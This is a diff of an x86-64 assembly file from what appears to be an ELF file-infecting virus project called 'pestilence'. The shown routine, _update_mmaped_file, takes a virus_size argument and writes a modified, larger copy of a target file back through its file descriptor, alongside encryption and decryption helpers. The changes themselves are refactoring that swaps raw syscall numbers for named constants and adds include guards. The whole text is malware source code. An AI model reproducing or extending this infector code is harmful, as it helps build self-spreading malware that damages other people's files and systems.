@@ -1,15 +1,16 @@
-%define PAGE_SIZE 8192
+%define UPDATE_MMAPED_FILE_S
+%include "pestilence.lst"
 
 section .text
 	global _update_mmaped_file
-	extern _string
-	extern _final_end
-	extern _decrypt
-	extern _start
-	extern _end_decrypt
-	extern _o_entry
-	extern _encrypt_zone
-	extern _encrypted_part_start
+;	extern _string
+;	extern _final_end
+;	extern _decrypt
+;	extern _start
+;	extern _end_decrypt
+;	extern _o_entry
+;	extern _encrypt_zone
+;	extern _encrypted_part_start
 
 _update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
 	enter 256, 0
@@ -229,7 +230,7 @@ _init_mmap_tmp:
 ;;;;;;;;;;;;;;;;;
 ; mmap tmp
 _mmap_tmp:
-	mov rax, 9
+	mov rax, SYS_MMAP
 	mov rdi, 0
 	mov rsi, QWORD [rsp + 8]
 	add rsi, PAGE_SIZE
@@ -387,7 +388,7 @@ _last_write:
 
 _write_into_file:
 ;; write(fd, mmap_tmp, file_size + PAGE_SIZE)
-	mov rax, 1
+	mov rax, SYS_WRITE
 	mov rdi, QWORD [rsp + 24]
 	mov rsi, QWORD [rsp + 108]
 	mov rdx, QWORD [rsp + 8]
@@ -396,13 +397,13 @@ _write_into_file:
 	mov QWORD [rsp + 124], 1
 
 _munmap_key:
-	mov rax, 11
+	mov rax, SYS_MUNMAP
 	mov rdi, QWORD [rsp + 132]
 	mov rsi, 256
 	syscall
 
 _munmap:
-	mov rax, 11
+	mov rax, SYS_MUNMAP
 	mov rdi, QWORD [rsp + 108]
 	mov rsi, QWORD [rsp + 8]
 	add rsi, PAGE_SIZE
@@ -412,3 +413,5 @@ _end:
 	mov rax, QWORD [rsp + 124]
 	leave
 	ret
+
+%undef UPDATE_MMAPED_FILE_S
